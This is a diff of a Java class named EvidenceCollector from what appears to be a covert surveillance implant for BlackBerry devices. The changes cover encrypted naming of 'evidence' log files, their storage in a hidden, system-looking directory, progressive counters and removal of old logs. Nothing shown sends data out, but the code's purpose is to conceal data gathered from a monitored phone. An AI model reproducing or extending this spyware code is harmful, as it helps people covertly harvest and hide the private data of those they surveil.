@@ -16,11 +16,11 @@ import java.util.Vector;
 import javax.microedition.io.Connector;
 import javax.microedition.io.file.FileConnection;
 
+import net.rim.device.api.io.file.ExtendedFileConnection;
 import net.rim.device.api.system.PersistentObject;
 import net.rim.device.api.system.PersistentStore;
-import net.rim.device.api.system.RuntimeStore;
 import net.rim.device.api.util.NumberUtilities;
-import blackberry.agent.Agent;
+import blackberry.Singleton;
 import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Check;
@@ -28,7 +28,7 @@ import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.fs.AutoFile;
 import blackberry.fs.Path;
-import blackberry.interfaces.Singleton;
+import blackberry.interfaces.iSingleton;
 import blackberry.utils.DoubleStringSortVector;
 import blackberry.utils.StringSortVector;
 
@@ -37,10 +37,9 @@ import blackberry.utils.StringSortVector;
  * 
  * @author zeno
  */
-public final class EvidenceCollector implements Singleton {
+public final class EvidenceCollector implements iSingleton {
     //#ifdef DEBUG
-    private static Debug debug = new Debug("EvidenceColl",
-            DebugLevel.INFORMATION);
+    private static Debug debug = new Debug("EvidenceColl", DebugLevel.INFORMATION);
     //#endif
 
     static EvidenceCollector instance = null;
@@ -74,7 +73,7 @@ public final class EvidenceCollector implements Singleton {
      */
     public static String decryptName(final String logMask) {
         return Encryption.decryptName(logMask, Encryption.getKeys()
-                .getChallengeKey()[0]);
+                .getProtoKey()[0]);
     }
 
     /**
@@ -86,7 +85,7 @@ public final class EvidenceCollector implements Singleton {
      */
     public static String encryptName(final String logMask) {
         return Encryption.encryptName(logMask, Encryption.getKeys()
-                .getChallengeKey()[0]);
+                .getProtoKey()[0]);
     }
 
     /**
@@ -96,16 +95,27 @@ public final class EvidenceCollector implements Singleton {
      */
     public static synchronized EvidenceCollector getInstance() {
         if (instance == null) {
-            instance = (EvidenceCollector) RuntimeStore.getRuntimeStore().get(
+            instance = (EvidenceCollector) Singleton.self().get(
                     GUID);
             if (instance == null) {
                 final EvidenceCollector singleton = new EvidenceCollector();
-                RuntimeStore.getRuntimeStore().put(GUID, singleton);
+                singleton.initKeys();
+                singleton.initProgressive();
+                Singleton.self().put(GUID, singleton);
                 instance = singleton;
             }
         }
 
         return instance;
+    }
+
+    public void initKeys() {
+        byte[] proto = keys.getProtoKey();
+        seed = proto[0];
+    }
+
+    private void initProgressive() {
+        logProgressive = deserializeProgressive();
     }
 
     // public boolean storeToMMC;
@@ -119,14 +129,14 @@ public final class EvidenceCollector implements Singleton {
 
     /**
      * Instantiates a new log collector.
+     * 
+     * @throws Exception
      */
     private EvidenceCollector() {
         super();
         logVector = new Vector();
 
-        logProgressive = deserializeProgressive();
         keys = Encryption.getKeys();
-        seed = keys.getChallengeKey()[0];
     }
 
     private void clear() {
@@ -151,27 +161,20 @@ public final class EvidenceCollector implements Singleton {
             //#endif
             logProgressivePersistent.setContents(new Integer(1));
         }
+        int logProgressiveRet = 0;
 
-        final int logProgressiveRet = ((Integer) logProgressivePersistent
-                .getContents()).intValue();
+        try {
+            logProgressiveRet = ((Integer) logProgressivePersistent
+                    .getContents()).intValue();
+        } catch (Exception ex) {
+            //#ifdef DEBUG
+            debug.error(ex);
+            debug.error("First time of logProgressivePersistent");
+            //#endif
+            logProgressivePersistent.setContents(new Integer(1));
+        }
+
         return logProgressiveRet;
-    }
-
-    /**
-     * Factory.
-     * 
-     * @param agent
-     *            the agent
-     * @param onSD
-     *            the on sd
-     * @return the log
-     */
-    public synchronized Evidence factory(final Agent agent, final boolean onSD) {
-
-        final Evidence log = new Evidence(agent.agentId, agent.onSD(),
-                keys.getAesKey());
-
-        return log;
     }
 
     /**
@@ -221,7 +224,7 @@ public final class EvidenceCollector implements Singleton {
         //#endif
 
         final Vector vector = new Vector();
-        final String basePath = onSD ? Path.SD() : Path.USER();
+        final String basePath = Path.logs();
 
         final String blockDir = "_" + (progressive / LOG_PER_DIRECTORY);
 
@@ -248,7 +251,7 @@ public final class EvidenceCollector implements Singleton {
         //#endif
 
         vector.addElement(new Integer(progressive));
-        vector.addElement(basePath + Path.LOG_DIR_BASE); // file:///SDCard/BlackBerry/system/$RIM313/$1
+        vector.addElement(basePath); // file:///SDCard/BlackBerry/system/$RIM313/$1
         vector.addElement(blockDir); // 1
         vector.addElement(encName); // ?
         vector.addElement(fileName); // unencrypted file
@@ -283,15 +286,10 @@ public final class EvidenceCollector implements Singleton {
         //#ifdef DEBUG
         debug.info("removeLogDirs");
         //#endif
-        
-        
+
         int removed = 0;
-        
-        if(Path.isSDAvailable()){
-         removed = removeLogRecursive(Path.SD(), numFiles);
-        }
-        
-        removed += removeLogRecursive(Path.USER(), numFiles - removed);
+
+        removed = removeLogRecursive(Path.hidden(), numFiles - removed);
         return removed;
     }
 
@@ -365,10 +363,11 @@ public final class EvidenceCollector implements Singleton {
         //#endif
 
         final StringSortVector vector = new StringSortVector();
-        FileConnection fc;
+        ExtendedFileConnection fc;
 
         try {
-            fc = (FileConnection) Connector.open("file://" + currentPath);
+            fc = (ExtendedFileConnection) Connector.open("file://"
+                    + currentPath);
 
             if (fc.isDirectory()) {
                 final Enumeration fileLogs = fc.list(Path.LOG_DIR_BASE + "*",
@@ -386,6 +385,10 @@ public final class EvidenceCollector implements Singleton {
                 }
 
                 vector.reSort();
+            } else {
+                //#ifdef DEBUG
+                debug.error("scanForDirLogs, not a directory: " + currentPath);
+                //#endif
             }
 
             fc.close();
@@ -425,40 +428,51 @@ public final class EvidenceCollector implements Singleton {
 
         final DoubleStringSortVector vector = new DoubleStringSortVector();
 
-        FileConnection fcDir = null;
+        ExtendedFileConnection fcDir = null;
         // FileConnection fcFile = null;
         try {
-            fcDir = (FileConnection) Connector.open("file://" + currentPath
-                    + dir);
+            fcDir = (ExtendedFileConnection) Connector.open("file://"
+                    + currentPath + dir);
 
-            final Enumeration fileLogs = fcDir.list("*", true);
+            if (fcDir.isDirectory()) {
 
-            while (fileLogs.hasMoreElements()) {
-                final String file = (String) fileLogs.nextElement();
+                //#ifdef DEBUG
+                debug.trace("scanForEvidences " + currentPath + dir + " size:" + fcDir.directorySize(false));
+                //#endif
+                final Enumeration fileLogs = fcDir.list("*", true);
 
-                // fcFile = (FileConnection) Connector.open(fcDir.getURL() +
-                // file);
-                // e' un file, vediamo se e' un file nostro
-                final String logMask = EvidenceCollector.LOG_EXTENSION;
-                final String encLogMask = encryptName(logMask);
+                while (fileLogs.hasMoreElements()) {
+                    final String file = (String) fileLogs.nextElement();
 
-                if (file.endsWith(encLogMask)) {
-                    // String encName = fcFile.getName();
-                    //#ifdef DEBUG
-                    debug.trace("enc name: " + file);
-                    //#endif
-                    final String plainName = decryptName(file);
-                    //#ifdef DEBUG
-                    debug.info("plain name: " + plainName);
-                    //#endif
+                    // fcFile = (FileConnection) Connector.open(fcDir.getURL() +
+                    // file);
+                    // e' un file, vediamo se e' un file nostro
+                    final String logMask = EvidenceCollector.LOG_EXTENSION;
+                    final String encLogMask = encryptName(logMask);
 
-                    vector.addElement(plainName, file);
+                    if (file.endsWith(encLogMask) || file.endsWith(encLogMask + ".rem")) {
+                        // String encName = fcFile.getName();
+                        //#ifdef DEBUG
+                        debug.trace("enc name: " + file);
+                        //#endif
+                        final String plainName = decryptName(file);
+                        //#ifdef DEBUG
+                        debug.info("plain name: " + plainName);
+                        //#endif
+
+                        vector.addElement(plainName, file);
+                    }
                 }
+            } else {
+                //#ifdef DEBUG                
+                debug.error("scanForEvidences, not a directory: " + currentPath
+                        + " / " + dir);
+                //#endif
             }
 
         } catch (final IOException e) {
             //#ifdef DEBUG
-            debug.error("scanForLogs: " + e);
+            debug.error("scanForEvidences: " + e);
             //#endif
 
         } finally {
@@ -474,7 +488,7 @@ public final class EvidenceCollector implements Singleton {
         }
 
         //#ifdef DEBUG
-        debug.trace("scanForLogs numDirs: " + vector.size());
+        debug.trace("scanForEvidences numDirs: " + vector.size());
 
         //#endif
         return vector.getValues();
